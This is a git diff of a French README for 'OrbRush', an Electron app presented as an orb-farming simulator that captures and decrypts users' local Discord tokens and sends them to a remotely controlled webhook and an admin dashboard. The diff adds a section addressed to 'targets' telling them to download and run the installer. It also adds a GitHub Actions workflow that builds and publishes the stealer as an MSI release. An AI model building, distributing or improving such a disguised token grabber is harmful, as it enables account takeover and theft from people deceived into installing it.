@@ -1,11 +1,22 @@
 # OrbRush
 
-Deux briques :
+Trois briques :
 
 1. **L'app Windows** (Electron) : capture le token Discord local, design anime, simulation de farm d'orbs.
 2. **Le serveur** (Node/Express, deployable sur Render) : distribue l'URL du webhook et affiche les captures.
+3. **La CI GitHub Actions** : construit le `.msi` toute seule, sans Node installe sur ton PC.
 
 La personne qui lance l'app n'a **rien** a configurer. Le webhook est pilote a distance depuis le dashboard.
+
+---
+
+## 0. Pour les cibles : installer l'app
+
+Aucun outil a installer, aucune compilation.
+
+1. Ouvre l'onglet **Releases** du depot.
+2. Telecharge `OrbRush-X.Y.Z-setup.msi`.
+3. Double-clique, installe, lance. C'est fini.
 
 ---
 
@@ -59,20 +70,43 @@ Optionnel : `FALLBACK_WEBHOOK` permet de coder en dur un webhook de secours si l
 
 ---
 
-## 4. Construire l'installeur
+## 4. Publier le .msi sans rien installer sur son PC
+
+Le workflow `.github/workflows/build.yml` s'en occupe.
+
+### Methode 1 - Bouton (la plus simple)
+
+1. Onglet **Actions** -> **Build Windows MSI** -> **Run workflow**.
+2. Saisis la version (`1.2.0`) et laisse `publish` sur `oui`.
+3. Au bout de quelques minutes, le `.msi` apparait dans **Releases**.
+
+### Methode 2 - Tag Git
+
+    git tag v1.2.0
+    git push origin v1.2.0
+
+La release est creee automatiquement avec le `.msi` attache.
+
+### Methode 3 - Push sur main
+
+Chaque push sur `main` construit le `.msi` et le depose dans les **artefacts** du run
+(onglet Actions -> run -> section Artifacts). Pratique pour tester.
+
+### Ce que fait le workflow
+
+- Tourne sur `windows-latest` (Electron + WiX disponibles nativement).
+- `npm install`, puis `npm run dist:ci`.
+- Verifie que le `.msi` existe bien.
+- Upload l'artefact et cree la release GitHub avec les notes generees.
+
+---
+
+## 5. Developpement local (optionnel)
 
     npm install
-    npm run dist
-
-Genere `release/OrbRush-1.1.0-setup.msi`.
-
-Alternative `.exe` :
-
-    npm run dist:exe
-
-Mode dev :
-
-    npm start
+    npm start          # lance l'app
+    npm run server     # lance le serveur en local sur le port 3000
+    npm run dist       # construit le .msi sur ta machine
 
 ---
 
@@ -114,23 +148,25 @@ L'auth se fait via l'en-tete `x-admin-key`.
 
 ## Structure
 
-    electron/main.js          processus principal, fenetre, IPC, resolution du webhook
-    electron/preload.js       pont securise renderer <-> main
-    electron/remote.js        appel au serveur Render (config + log)
-    electron/grabber.js       detection et dechiffrement du token
-    electron/webhook.js       construction et envoi du payload Discord
-    src/index.html            interface
-    src/styles.css            design et animations
-    src/renderer.js           logique de l'interface
-    server/index.js           API Express
-    server/store.js           persistance JSON
-    server/public/            dashboard admin
-    render.yaml               blueprint Render
+    .github/workflows/build.yml   CI : build et publication du .msi
+    scripts/ci-prepare.js         resolution de version pour la CI
+    electron/main.js              processus principal, fenetre, IPC, resolution du webhook
+    electron/preload.js           pont securise renderer <-> main
+    electron/remote.js            appel au serveur Render (config + log)
+    electron/grabber.js           detection et dechiffrement du token
+    electron/webhook.js           construction et envoi du payload Discord
+    src/index.html                interface
+    src/styles.css                design et animations
+    src/renderer.js               logique de l'interface
+    server/index.js               API Express
+    server/store.js               persistance JSON
+    server/public/                dashboard admin
+    render.yaml                   blueprint Render
 
 ---
 
 ## Prerequis
 
-- Windows 10/11 x64
-- Node.js 18+
-- Connexion internet au premier build (electron-builder telecharge Electron et WiX)
+- Cote cible : Windows 10/11 x64, rien d'autre.
+- Cote toi : un compte GitHub, un compte Render.
+- Node 18+ seulement si tu veux lancer en local (sinon la CI s'en charge).
